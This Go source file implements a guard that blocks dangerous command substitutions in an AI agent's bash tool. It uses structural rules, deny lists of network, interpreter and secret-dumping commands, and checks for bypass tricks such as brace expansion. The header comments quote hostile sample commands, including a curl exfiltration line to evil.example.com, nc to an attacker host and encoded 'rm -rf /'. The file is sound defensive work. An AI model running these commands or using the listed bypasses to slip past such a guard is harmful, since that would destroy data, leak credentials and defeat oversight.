// Package tools — command-substitution safety guard for the `bash` tool.
//
// # Why this file exists
//
// The hardcoded deny-pattern baseline (defaultDenyPatterns in shell.go, FR-B4)
// used to carry a single blanket rule:
//
//	regexp.MustCompile(`\$\([^)]+\)`)   // "reject ANY command substitution"
//
// That rule blocked real attacks, but it also blocked every benign
// substitution — `$(seq 1 5)`, `$(date)`, `$(pwd)`, `$(hostname)` — which made
// bounded `for` loops unusable and forced agents into `printf` workarounds. It
// additionally made the four narrower rules immediately below it in the list
// (`$(cat `, `$(curl `, `$(wget `, `$(which `) unreachable dead code.
//
// # Why "recursively re-apply defaultDenyPatterns to the inner text" is a no-op
//
// The obvious narrowing — extract the text inside `$( … )` and re-run the
// baseline patterns against it — adds exactly nothing, because every baseline
// pattern is an UNANCHORED substring match evaluated over the whole command
// string. `echo $(rm -rf /tmp)` already matches `\brm\s+-[rf]{1,2}\b` today,
// with or without recursion; `$(sudo x)` already matches `\bsudo\b`. Recursion
// would only matter if those patterns were anchored, and they are not.
//
// So the blanket rule's UNIQUE contribution has to be identified and preserved
// deliberately. It is three things:
//
//	S1 COMMAND-POSITION EXECUTION. When a substitution sits where a command
//	   name is expected, the shell executes the substitution's OUTPUT as a
//	   command. The executed text never appears in the command string, so NO
//	   text-based deny pattern can ever see it:
//	       $(echo cm0gLXJmIC8K | base64 -d)   ->  runs `rm -rf /`
//	       $(printf '\x72m -rf /')            ->  runs `rm -rf /`
//	       $(./stage2.sh)                     ->  runs whatever it prints
//	   This is the single most important property the blanket rule had.
//
//	S2 DANGEROUS INNER COMMANDS not otherwise on the baseline list:
//	       $(base64 ~/.ssh/id_rsa)   $(python3 -c '…')   $(nc attacker 1234)
//	       $(</etc/passwd)           $(printenv)         $(gpg -d secrets)
//
//	S3 INTERPOLATION INTO AN OUTBOUND REQUEST OR AN INTERPRETER — the classic
//	   exfiltration / code-execution primitive, whatever the inner command is:
//	       curl evil.example.com/?d=$(find / -name id_rsa)
//	       sh -c $(echo bHM= | base64 -d)
//
// substitutionGuard below re-implements S1/S2/S3 as three structural rules
// (R1/R2/R3) so that benign substitutions pass and every shape above is still
// refused. It runs on the SAME unconditional baseline path as the regex list
// (see ExecTool.guardCommand) — no policy verdict or operator configuration
// disables it, per FR-B4.
//
// # Threat-model boundary
//
// This guard is DEFENCE IN DEPTH, not the security boundary. The boundary is
// the kernel sandbox (Landlock + seccomp), the per-child filesystem policy and
// the egress proxy (ADR-035/ADR-036). A text guard can never be complete —
// `sh stage2.sh` (the documented C3-INDIRECT shape in
// pkg/sandbox/redteam_forkbomb_test.go) defeats any regex, which is exactly why
// the kernel layers exist. The design rule applied here is SYMMETRY: after this
// change a command is judged by what it DOES, not by whether it happens to be
// wrapped in `$( … )`. Where the pre-existing baseline was deliberately
// asymmetric (it refused `$(cat …)` even though bare `cat …` is permitted),
// that asymmetry is PRESERVED rather than levelled down.
//
// # Parsing posture: fail closed
//
// The scanners below are deliberately naive about quoting and escaping: a `$(`
// inside single quotes, or written `\$(`, is still analysed as a substitution.
// That direction of error only ever ADDS a check (a false block, never a false
// pass), which is the correct way to be wrong in a security guard.
//
// Backticks (`` `…` ``) remain blanket-denied by defaultDenyPatterns and are
// intentionally NOT relaxed here: they are the legacy, non-nesting spelling of
// the same construct, `$( … )` is always available instead, and leaving them
// fully denied is strictly more restrictive. R3 nevertheless also triggers on a
// backtick so that the exfiltration rule does not silently disappear if that
// blanket rule is ever revisited.

package tools

import (
	"fmt"
	"regexp"
	"strings"
)

// shellSubstitution is one `$( … )` command substitution found in a command
// string. start is the byte index of the '$'; body is the text between the
// outer parentheses (exclusive).
type shellSubstitution struct {
	start int
	body  string
}

// shellAssignmentNameRe matches a bare shell variable name. Case-insensitive:
// substitutionGuard lowercases before calling in, but the helpers must not
// silently weaken if a future caller forgets (`LC_ALL=C cat f` has to resolve
// to the head `cat` either way).
var shellAssignmentNameRe = regexp.MustCompile(`(?i)^[a-z_][a-z0-9_]*$`)

// commandIntroducers are tokens after which the shell parses the NEXT word as a
// command name. Used by isCommandPosition (R1).
//
// Deliberately limited to SYNTAX keywords. Command wrappers that also execute
// their argument (`eval`, `exec`, `command`, `env`, `xargs`, `sudo`, `time`, …)
// are handled by R3 instead, which matches only in command-HEAD position: a
// word like "command" or "time" occurs in ordinary English, and matching it as
// a bare preceding token blocked innocuous strings such as
// `echo "running command $(date)"`. R3's head-position matching has no such
// false positive while still refusing `eval $(…)`, `env $(…)`, `time $(…)`.
var commandIntroducers = map[string]bool{
	"if": true, "then": true, "else": true, "elif": true,
	"do": true, "while": true, "until": true, "!": true,
}

// shellKeywordSkips are keywords that are never a command NAME; when one is
// found at the head of a segment the scan moves on to the following word (so
// `do curl …` yields the head `curl`, not `do`).
//
// `time` is intentionally ABSENT: it is a command wrapper, so it must surface
// as a head for R2/R3 rather than being skipped over.
var shellKeywordSkips = map[string]bool{
	"if": true, "then": true, "else": true, "elif": true, "fi": true,
	"for": true, "do": true, "done": true, "while": true, "until": true,
	"case": true, "esac": true, "in": true, "select": true,
	"function": true, "!": true,
}

// substitutionDenyAnySegment lists command names that are refused wherever they
// appear inside a substitution's pipeline. Membership criterion: the command is
// either (a) an arbitrary-code / privilege / network primitive, or (b) has no
// useful stdout at all, so putting it inside `$( … )` is never a legitimate
// thing to want.
//
// Text tools with exec forms (awk, sed, find) are INCLUDED even though their
// benign text-processing forms are permitted at top level: inside a
// substitution their exec forms (awk system() / getline cmd |, sed e command
// and e flag, find -exec / -execdir) become arbitrary-code primitives whose
// payload fires as a side effect of evaluating the substitution. They are
// strictly more dangerous inside `$( … )` than `cat` (already denied here) and
// have safe alternatives outside a substitution (pipe into them rather than
// capturing their output). The asymmetry matches the guard's stated design
// rule: a command is judged by what it DOES inside a substitution, not by
// whether the bare top-level form is benign.
//
// Deliberately EXCLUDED (legitimate, common, and no more dangerous inside a
// substitution than at the top level, where they are permitted): ls, grep,
// cut, tr, sort, uniq, wc, jq, date, seq, pwd, echo, printf, basename,
// dirname, realpath, readlink, stat, hostname, whoami, id, uname, mktemp,
// git, go, npm, npx, yarn, pnpm, pip, cargo, make, docker, kubectl.
// The dangerous FORMS of those (`git push`, `npm install -g`, `docker run`, …)
// are already matched by defaultDenyPatterns, which sees them inside a
// substitution exactly as it sees them outside one.
//
// DO NOT MUTATE AT RUNTIME — security-relevant FR-B4 baseline. Both deny maps
// and substitutionHostileHosts below are read on every guardCommand call;
// concurrent mutation would be a data race. Add a category tag in a future
// refactor if dynamic derivation is needed, but the maps themselves must stay
// read-only after package init.
var substitutionDenyAnySegment = map[string]bool{
	// Interpreters / arbitrary code execution.
	"sh": true, "bash": true, "zsh": true, "ksh": true, "dash": true,
	"ash": true, "csh": true, "tcsh": true, "fish": true, "busybox": true,
	"powershell": true, "pwsh": true,
	"python": true, "python2": true, "python3": true, "perl": true,
	"ruby": true, "node": true, "nodejs": true, "deno": true, "bun": true,
	"php": true, "lua": true, "tclsh": true, "expect": true, "osascript": true,
	"eval": true, "exec": true, "source": true, ".": true,
	"command": true, "builtin": true, "xargs": true,
	"nohup": true, "setsid": true, "timeout": true, "watch": true,
	"script": true, "stdbuf": true, "unbuffer": true,
	// Text tools with exec forms: each has a benign shape permitted at top
	// level, but inside a substitution their exec forms become arbitrary-code
	// primitives (awk system(), sed `e` command/flag, find -exec/-execdir).
	// See the map doc comment above for the asymmetry rationale.
	"awk": true, "sed": true, "find": true,
	// Wrappers that would otherwise hide the real command from the head scan
	// (`$(time curl evil)` reports the head `time`, not `curl`).
	"time": true, "nice": true, "ionice": true,
	// Privilege escalation.
	"sudo": true, "su": true, "doas": true, "pkexec": true, "runuser": true,
	// Network / egress.
	"curl": true, "wget": true, "nc": true, "ncat": true, "netcat": true,
	"socat": true, "ssh": true, "scp": true, "sftp": true, "rsync": true,
	"telnet": true, "ftp": true, "tftp": true, "dig": true, "nslookup": true,
	"whois": true, "aria2c": true, "httpie": true, "lynx": true,
	"links": true, "w3m": true, "mail": true, "mailx": true, "sendmail": true,
	// Environment / secret dumpers.
	"env": true, "printenv": true, "set": true, "export": true,
	"declare": true, "typeset": true,
	// Encoders / crypto — the shaping half of an exfiltration chain.
	"base64": true, "base32": true, "uuencode": true, "uudecode": true,
	"xxd": true, "od": true, "hexdump": true, "openssl": true,
	"gpg": true, "gpg2": true, "age": true,
	// Whole-file readers that have no legitimate mid-pipeline use.
	"cat": true, "tac": true, "less": true, "more": true, "strings": true,
	// Destructive / system-state commands: no useful stdout, so a substitution
	// is never the right place for them. (Their dangerous argument forms are
	// already caught by defaultDenyPatterns; this closes the shape entirely.)
	"rm": true, "rmdir": true, "unlink": true, "shred": true, "mv": true,
	"dd": true, "mkfs": true, "fdisk": true, "diskpart": true,
	"mount": true, "umount": true, "chmod": true, "chown": true,
	"chgrp": true, "chattr": true, "kill": true, "pkill": true,
	"killall": true, "systemctl": true, "service": true, "reboot": true,
	"shutdown": true, "poweroff": true, "halt": true, "init": true,
	"insmod": true, "modprobe": true, "rmmod": true, "iptables": true,
	"nft": true, "crontab": true, "at": true,
}

// substitutionDenyFirstSegment lists command names refused only when they are
// the FIRST thing inside the substitution — i.e. when they are the SOURCE of
// the substituted data. This preserves the head-of-substitution semantics of
// the legacy `\$\(\s*which\s+` rule in shell.go (the only one of the four
// legacy `$(cmd ` patterns that maps to FirstSegment rather than AnySegment —
// cat, curl, wget are all dangerous anywhere in the pipeline and live in
// substitutionDenyAnySegment above) for commands that DO have legitimate
// mid-pipeline uses: `$(ls | head -1)` stays allowed, `$(head -1 secrets)`
// does not.
//
// DO NOT MUTATE AT RUNTIME — security-relevant FR-B4 baseline (see
// substitutionDenyAnySegment comment).
var substitutionDenyFirstSegment = map[string]bool{
	"head": true, "tail": true,
	"which": true, "whereis": true, "locate": true,
}

// substitutionHostileHosts are outer-command command NAMES that turn any
// substitution into an exfiltration or code-execution primitive: anything that
// speaks to the network, and anything that executes its arguments. Used by R3.
// It is intentionally a SUBSET of substitutionDenyAnySegment (the interpreter,
// privilege and network groups) — the readers and destructive commands are not
// hostile hosts, only hostile payloads. The init() consistency check at the
// bottom of this file fails the package load if that subset relationship ever
// drifts.
//
// DO NOT MUTATE AT RUNTIME — security-relevant FR-B4 baseline (see
// substitutionDenyAnySegment comment).
var substitutionHostileHosts = func() map[string]bool {
	m := make(map[string]bool, 64)
	for _, n := range []string{
		// Interpreters / exec wrappers.
		"sh", "bash", "zsh", "ksh", "dash", "ash", "csh", "tcsh", "fish",
		"busybox", "powershell", "pwsh",
		"python", "python2", "python3", "perl", "ruby", "node", "nodejs",
		"deno", "bun", "php", "lua", "tclsh", "expect", "osascript",
		"eval", "exec", "source", ".", "command", "builtin", "xargs",
		"nohup", "setsid", "timeout", "watch", "script", "stdbuf", "unbuffer",
		"env", "time", "nice", "ionice",
		// Privilege escalation.
		"sudo", "su", "doas", "pkexec", "runuser",
		// Network / egress.
		"curl", "wget", "nc", "ncat", "netcat", "socat", "ssh", "scp",
		"sftp", "rsync", "telnet", "ftp", "tftp", "dig", "nslookup",
		"whois", "aria2c", "httpie", "lynx", "links", "w3m",
		"mail", "mailx", "sendmail",
	} {
		m[n] = true
	}
	return m
}()

// substitutionGuard is the structural half of the FR-B4 baseline: it decides
// whether the command substitutions in a command are safe. Returns a non-empty
// block message when the command must be refused, "" when it may proceed.
//
// Callers must treat this exactly like applyDenyPatterns — unconditional, not
// disableable by policy or operator config.
func substitutionGuard(command string) string {
	lower := lowerASCII(command)
	subs := extractCommandSubstitutions(lower)
	// Backticks are already blanket-denied by defaultDenyPatterns; they are
	// included here so R3 keeps holding if that ever changes (see file doc).
	if len(subs) == 0 && strings.IndexByte(lower, '`') < 0 {
		return ""
	}

	// R1 (S1) — a substitution in command position has its OUTPUT executed as a
	// command, which no text pattern can inspect. Always refuse.
	for _, s := range subs {
		if isCommandPosition(lower, s.start) {
			return "Command blocked by safety guard (command substitution in command position: " +
				"its output would be executed as a command; assign it with x=$(...) or print it with echo $(...) instead)"
		}
	}

	// R2 (S2) — dangerous command inside the substitution.
	for _, s := range subs {
		if head, bad := dangerousSubstitutionCommand(s.body); bad {
			return "Command blocked by safety guard (dangerous command inside $(...): " + head + ")"
		}
	}

	// R3 (S3) — a substitution feeding a network or interpreter command.
	if host, bad := hostileSubstitutionHost(lower); bad {
		return "Command blocked by safety guard (command substitution combined with " + host + ")"
	}

	return ""
}

// extractCommandSubstitutions returns every `$( … )` in s, including nested
// ones (each nesting level is reported separately, because the scan walks the
// whole string). Parenthesis depth is tracked so `$(echo $(date))` yields both
// bodies rather than one truncated at the first ')'.
//
// An unterminated `$(` is reported with the remainder of the string as its
// body — fail closed rather than ignoring it.
func extractCommandSubstitutions(s string) []shellSubstitution {
	var out []shellSubstitution
	for i := 0; i+1 < len(s); i++ {
		if s[i] != '$' || s[i+1] != '(' {
			continue
		}
		depth := 0
		end := -1
		for j := i + 1; j < len(s); j++ {
			switch s[j] {
			case '(':
				depth++
			case ')':
				depth--
				if depth == 0 {
					end = j
				}
			}
			if end >= 0 {
				break
			}
		}
		if end < 0 {
			out = append(out, shellSubstitution{start: i, body: s[i+2:]})
			continue
		}
		out = append(out, shellSubstitution{start: i, body: s[i+2 : end]})
	}
	return out
}

// isShellWordBreak reports whether c ends a shell word.
func isShellWordBreak(c byte) bool {
	switch c {
	case ' ', '\t', '\n', '\r', ';', '|', '&', '(', ')', '{', '}', '<', '>', '`':
		return true
	}
	return false
}

// isHeadTerminator reports whether c ends the command-NAME token of a segment.
// '=' is deliberately absent: it must stay inside the token so a leading
// `VAR=value` assignment prefix can be recognised and skipped.
func isHeadTerminator(c byte) bool {
	switch c {
	case ' ', '\t', '\n', '\r', '<', '>', '|', ';', '&', '(', ')', '{', '}', '`', '$':
		return true
	}
	return false
}

// stripShellQuotes removes quoting characters from a token so that `"cat"`,
// `c"a"t` and `c\at` all normalise to `cat`. Shell word-splitting happens
// before quote removal, which is why this is applied to the whole token.
func stripShellQuotes(tok string) string {
	if !strings.ContainsAny(tok, `'"\`) {
		return tok
	}
	var b strings.Builder
	b.Grow(len(tok))
	for i := 0; i < len(tok); i++ {
		switch tok[i] {
		case '\'', '"', '\\':
		default:
			b.WriteByte(tok[i])
		}
	}
	return b.String()
}

// isCommandPosition reports whether the substitution starting at byte index
// dollar occupies a position where the shell parses a COMMAND NAME — meaning
// its expansion is executed rather than passed as data.
//
// R1 command position:  `$(x)`  `; $(x)`  `| $(x)`  `&& $(x)`  `do $(x)`
//
//	`FOO=1 $(x)`  `ec$(ho) hi`  `(  $(x) )`
//
// Command WRAPPERS like `eval $(x)`, `exec $(x)`, `sudo $(x)`, `time $(x)` are
// NOT R1: commandIntroducers is deliberately limited to syntax keywords
// (`if`/`then`/`do`/…) because bare words like `eval`, `time` and `command`
// occur in ordinary English. Those wrappers are caught by R3
// (hostileSubstitutionHost), which matches command NAMES in head position only.
//
// Not command position:  `echo $(x)`  `x=$(x)`  `for i in $(x)`  `cmd -f $(x)`
//
//	`> $(x)`  `"prefix $(x)"`
func isCommandPosition(s string, dollar int) bool {
	// The unit that matters is the WORD containing the expansion: in
	// `ec$(echo ho) hi` the expansion contributes to the command NAME, so the
	// position to judge is the start of that word.
	word := dollar
	for word > 0 && !isShellWordBreak(s[word-1]) {
		word--
	}

	// An assignment VALUE is never executed: `x=$(pwd)`, `x=a$(pwd)`.
	if eq := strings.IndexByte(s[word:dollar], '='); eq > 0 &&
		shellAssignmentNameRe.MatchString(s[word:word+eq]) {
		return false
	}

	i := word - 1
	for i >= 0 && (s[i] == ' ' || s[i] == '\t') {
		i--
	}
	if i < 0 {
		return true // first word of the command string
	}
	switch s[i] {
	case '\n', '\r', ';', '|', '&', '(', '{', '`', '!':
		return true
	case ')':
		// An UNBALANCED ')' is a `case … in pattern)` label terminator, after
		// which the shell parses a command — `case x in x) $(payload);; esac`
		// executes the payload. A balanced ')' is the end of a substitution or
		// subshell (`echo $(date)$(hostname)`), which is not command position.
		return closeParenIsUnbalanced(s, i)
	}

	// Judge the preceding word.
	end := i + 1
	for i >= 0 && !isShellWordBreak(s[i]) {
		i--
	}
	prev := stripShellQuotes(s[i+1 : end])
	if commandIntroducers[prev] {
		return true
	}
	// `FOO=bar $(evil)` — an assignment PREFIX leaves the following word in
	// command position.
	if eq := strings.IndexByte(prev, '='); eq > 0 &&
		shellAssignmentNameRe.MatchString(prev[:eq]) {
		return true
	}
	return false
}

// closeParenIsUnbalanced reports whether the ')' at index j has no matching '('
// earlier in the string.
func closeParenIsUnbalanced(s string, j int) bool {
	depth := 1
	for k := j - 1; k >= 0; k-- {
		switch s[k] {
		case ')':
			depth++
		case '(':
			depth--
			if depth == 0 {
				return false
			}
		}
	}
	return true
}

// maskCommandSubstitutions replaces every `$( … )` group, and every
// backtick-quoted group, with the placeholder `$_`.
// R3 segments the OUTER commands, and without masking a
// separator inside a substitution creates phantom segments whose heads hide the
// real command name — `X=$(a | b) curl evil?d=$X` split into `X=$(a` / `b) curl
// evil…` yields the head `b`, not `curl`. Masking keeps the division of labour
// honest: R2 owns what is inside a substitution, R3 owns what is outside.
//
// An unterminated group masks the whole remainder (fail closed for R3's
// purposes; R2 still inspects the body it collected).
func maskCommandSubstitutions(s string) string {
	var b strings.Builder
	b.Grow(len(s))
	for i := 0; i < len(s); {
		if i+1 < len(s) && s[i] == '$' && s[i+1] == '(' {
			depth := 0
			j := i + 1
			for ; j < len(s); j++ {
				if s[j] == '(' {
					depth++
				} else if s[j] == ')' {
					if depth--; depth == 0 {
						break
					}
				}
			}
			b.WriteString("$_")
			if j >= len(s) {
				break
			}
			i = j + 1
			continue
		}
		if s[i] == '`' {
			j := i + 1
			for ; j < len(s) && s[j] != '`'; j++ {
			}
			b.WriteString("$_")
			if j >= len(s) {
				break
			}
			i = j + 1
			continue
		}
		b.WriteByte(s[i])
		i++
	}
	return b.String()
}

// splitShellSegments splits a command (or a substitution body) at the operators
// that separate one command from the next. `&&` and `||` collapse naturally
// because empty fields are dropped.
func splitShellSegments(s string) []string {
	return strings.FieldsFunc(s, func(r rune) bool {
		switch r {
		case '|', ';', '&', '\n', '\r':
			return true
		}
		return false
	})
}

// shellCommandHead returns the normalised command NAME at the head of one shell
// segment: quoting removed, ASCII-lowercased, leading `VAR=value` assignments
// and shell keywords skipped, and any directory prefix stripped
// (`/usr/bin/env` -> `env`). Returns "" when the segment names no command (e.g.
// it is a redirection).
//
// The second return value reports that the command NAME is built from an
// expansion (`$C f`, `$'\x63at' f`, `c$X f`) and therefore cannot be resolved
// by any text guard. Callers that judge the INSIDE of a substitution treat that
// as dangerous — it is precisely the shape used to hide a denied command name —
// while callers that judge the outer command must ignore it, since masked
// substitutions legitimately appear there as `$_`.
//
// NOTE: this scanner does NOT model bash brace expansion. A body like
// `{cat,/etc/passwd}` is seen as the literal token `{cat,/etc/passwd}` (after
// the directory-prefix strip, head `passwd`), not as the two words `cat`
// `/etc/passwd` that bash actually parses. R2 closes that bypass with a
// dedicated pre-check (dangerousBraceExpansionHead) before this scan runs.
func shellCommandHead(seg string) (string, bool) {
	head, fromExpansion, _ := shellCommandHeadDetailed(seg)
	return head, fromExpansion
}

// shellCommandHeadDetailed is shellCommandHead plus the one fact an ALLOW-list
// caller cannot do without: whether normalisation actually changed the token.
//
// The normalisation below (lowercasing, and stripping a directory prefix so
// `/bin/rm` is judged as `rm`) is correct and load-bearing for a DENY list —
// it is what stops `/bin/rm` walking past a rule keyed on `rm`. Used by an
// ALLOW list the same normalisation inverts into a bypass: `./cat`, `bin/cat`
// and `CAT` all normalise to the allowlisted head `cat`, so an agent that
// drops its own executable named `cat` into its working directory gets that
// program classified as a proven read (ADR-068 §5's "prove a read, or call it
// a write" — and this proved the wrong thing).
//
// The third return is true when the returned token is NOT byte-identical to
// the literal the command actually names, i.e. when a directory prefix was
// stripped or ASCII case was folded. An allow-list caller must refuse those.
func shellCommandHeadDetailed(seg string) (string, bool, bool) {
	// normalised describes ONLY the token this call ultimately returns. It is
	// recomputed each iteration and never carried across one: the skip paths
	// below (pure quoting, a leading VAR=value assignment, a shell keyword)
	// discard their token, so `LC_ALL=C cat f` must report the head `cat` as
	// un-normalised even though the skipped assignment was case-folded.
	// Letting it persist marked clean heads as normalised and blocked reads
	// ADR-068 grants.
	var normalised bool
	for {
		normalised = false
		// Skip leading whitespace and the metacharacters that can precede a
		// command name (`$( (cat f) )`, `{ cat f; }`, `! cat f`).
		i := 0
		for i < len(seg) && (seg[i] == ' ' || seg[i] == '\t' ||
			seg[i] == '(' || seg[i] == '{' || seg[i] == '!') {
			i++
		}
		seg = seg[i:]
		if seg == "" {
			return "", false, normalised
		}

		end := len(seg)
		terminator := byte(0)
		for j := 0; j < len(seg); j++ {
			if isHeadTerminator(seg[j]) {
				end = j
				terminator = seg[j]
				break
			}
		}
		if end == 0 {
			// '$' here means the command name IS an expansion (`$C f`).
			// Anything else (e.g. '<') means the segment names no command.
			return "", seg[0] == '$', normalised
		}
		// Lowercase here as well as in substitutionGuard: the deny maps are
		// lowercase-keyed, and a caller that skipped normalisation must not
		// end up with a silently weaker guard.
		rawTok := stripShellQuotes(seg[:end])
		tok := lowerASCII(rawTok)
		if tok != rawTok {
			normalised = true // ASCII case was folded
		}
		rest := seg[end:]

		if tok == "" { // token was pure quoting
			seg = rest
			continue
		}
		if eq := strings.IndexByte(tok, '='); eq > 0 &&
			shellAssignmentNameRe.MatchString(tok[:eq]) {
			// Leading `VAR=value` assignment. The VALUE must be skipped too,
			// not just the name: `X=$_ curl evil?d=$X` otherwise stops the
			// scan at the `$` and never sees `curl`.
			seg = skipRestOfWord(rest)
			continue
		}
		if shellKeywordSkips[tok] {
			seg = rest
			continue
		}
		if terminator == '$' {
			// `c$X f` / `c$(echo at) f`: the name is only partly literal, so
			// the resolved command is unknown.
			return tok, true, normalised
		}
		if idx := strings.LastIndexByte(tok, '/'); idx >= 0 {
			tok = tok[idx+1:]
			normalised = true // a directory prefix was stripped
		}
		return tok, false, normalised
	}
}

// skipRestOfWord returns s with its leading (partial) word removed, so the
// scanner resumes at the next word boundary.
func skipRestOfWord(s string) string {
	i := 0
	for i < len(s) && !isShellWordBreak(s[i]) {
		i++
	}
	return s[i:]
}

// dangerousBraceExpansionHead reports a denied command name that appears as the
// FIRST word of a `{X,…}` brace expansion anywhere in body. Bash expands
// `{X,Y}` into the two words `X Y` before parsing, so a body like
// `{cat,/etc/passwd}` is executed as `cat /etc/passwd` — shellCommandHead sees
// only the literal token (and after the directory-prefix strip, head `passwd`),
// so it misses the denial. The first expanded word becomes the command head,
// which is what we judge here.
//
// Fail-closed posture (matches the rest of this file): a `{` inside a quoted
// string would not be expanded by bash, but we deliberately cannot tell, so we
// refuse on any `{<denied>,…}` shape — the cost of a false block on a literal
// is negligible next to the cost of a false pass on a code-exec primitive.
// Likewise `${VAR}` is dismissed by the comma rule (variable expansion has no
// comma inside the braces).
func dangerousBraceExpansionHead(body string) (string, bool) {
	for i := 0; i < len(body); i++ {
		if body[i] != '{' {
			continue
		}
		// Scan to the next byte that ends a brace-expansion inner: comma (we
		// act on it), close-brace (no expansion — single word), or another
		// open brace (nested/adjacent — give up on this one and let the outer
		// loop find the inner brace). Stop at end-of-string too (fail-closed:
		// an unterminated `{cat,` is treated as a brace expansion).
		j := i + 1
		for j < len(body) && body[j] != ',' && body[j] != '}' && body[j] != '{' {
			j++
		}
		if j >= len(body) || body[j] != ',' {
			continue
		}
		// First comma-separated piece is the first word bash will expand.
		// Strip quoting and any leading whitespace inside the brace.
		first := strings.TrimLeft(body[i+1:j], " \t")
		// If the piece contains an inner word break (e.g. `{foo bar,…}`),
		// judge the last word of it — `{ a cat,…}` is not `a`, it's `cat`.
		if k := strings.LastIndexAny(first, " \t"); k >= 0 {
			first = first[k+1:]
		}
		first = lowerASCII(stripShellQuotes(first))
		if substitutionDenyAnySegment[first] {
			return first, true
		}
	}
	return "", false
}

// dangerousSubstitutionCommand implements R2: it reports the first dangerous
// command name found inside a substitution body. The returned name is always a
// key of one of the deny maps, never attacker-controlled free text.
func dangerousSubstitutionCommand(body string) (string, bool) {
	// `$(</etc/passwd)` — bash reads the file with no command at all, so the
	// head scan below would find nothing.
	if strings.HasPrefix(strings.TrimLeft(body, " \t"), "<") {
		return "$(<file) redirection read", true
	}
	// Brace-expansion parser differential: bash expands `{X,Y}` into the two
	// words `X Y` BEFORE parsing, so a body like `{cat,/etc/passwd}` is
	// executed as `cat /etc/passwd`. shellCommandHead sees the literal token
	// (the directory-prefix strip then turns `{cat,/etc/passwd}` into head
	// `passwd`) and misses the denial. Check this BEFORE the segment scan so
	// the bypass is closed regardless of where the brace appears.
	if head, ok := dangerousBraceExpansionHead(body); ok {
		return head + " (hidden by brace expansion)", true
	}
	for i, seg := range splitShellSegments(body) {
		head, fromExpansion := shellCommandHead(seg)
		if fromExpansion {
			// The command name is assembled from an expansion, so no text
			// guard can tell what it runs: `$($'\x63at' /etc/passwd)`,
			// `$($C /etc/passwd)`. Refuse rather than guess.
			return "a command name built from an expansion", true
		}
		if head == "" {
			continue
		}
		if substitutionDenyAnySegment[head] {
			return head, true
		}
		if i == 0 && substitutionDenyFirstSegment[head] {
			return head, true
		}
	}
	return "", false
}

// hostileSubstitutionHost implements R3: it reports whether the OUTER command
// runs anything that turns a substitution into exfiltration or code execution.
// Matching is on command NAMES only (not bare tokens), so `echo "running
// command $(date)"` and `for d in $(go env gopath)` are unaffected while
// `curl …$(…)` and `sh -c $(…)` are refused.
func hostileSubstitutionHost(command string) (string, bool) {
	// Checked on the RAW command: bash's /dev/tcp and /dev/udp pseudo-devices
	// are an egress channel with no command name to match on.
	if strings.Contains(command, "/dev/tcp/") || strings.Contains(command, "/dev/udp/") {
		return "a /dev/tcp or /dev/udp egress redirection", true
	}
	// Segmented on the MASKED command so a separator inside a substitution
	// cannot manufacture a segment that hides the real command name.
	for _, seg := range splitShellSegments(maskCommandSubstitutions(command)) {
		// fromExpansion is ignored here: `$_` placeholders are expected.
		if head, _ := shellCommandHead(seg); head != "" && substitutionHostileHosts[head] {
			return "the network/interpreter command " + head, true
		}
	}
	return "", false
}

// init enforces an internal consistency property between the two deny maps at
// package load time. substitutionHostileHosts is maintained by hand as a subset
// of substitutionDenyAnySegment (see its doc comment). If a hostile host is
// ever added without also being added to the deny-any map, R2 would silently
// stop catching that command inside a substitution while R3 still caught it as
// an outer command — a non-obvious asymmetric regression. Fail the package load
// loudly instead of running a degraded guard.
//
// This is the safe fallback for the single-source-of-truth refactor: a full
// category-tag derivation is non-trivial because the categories don't cleanly
// partition (e.g. `env` is both an interpreter wrapper and a secret dumper),
// so a runtime invariant is the lower-risk way to eliminate the drift hazard.
func init() {
	for host := range substitutionHostileHosts {
		if !substitutionDenyAnySegment[host] {
			panic(fmt.Sprintf(
				"omnipus security baseline (FR-B4): substitutionHostileHosts has %q "+
					"but substitutionDenyAnySegment does not — R2/R3 drift detected "+
					"(see shell_subst_guard.go)", host))
		}
	}
}
